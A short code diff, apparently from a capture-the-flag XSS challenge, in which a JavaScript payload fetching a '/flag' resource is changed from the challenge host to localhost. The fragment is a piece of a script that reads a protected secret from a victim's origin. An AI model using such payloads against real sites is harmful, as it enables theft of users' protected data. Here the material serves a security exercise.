@@ -2,7 +2,7 @@ const headers = new Headers()
 headers.append("Content-Type", "application/json")
 
 let flag = ""
-fetch('https://spiteful-xss.acmcyber.com/flag')
+fetch('https://localhost/flag')
   .then(response => {
     if (response.ok) {
       return response.text();
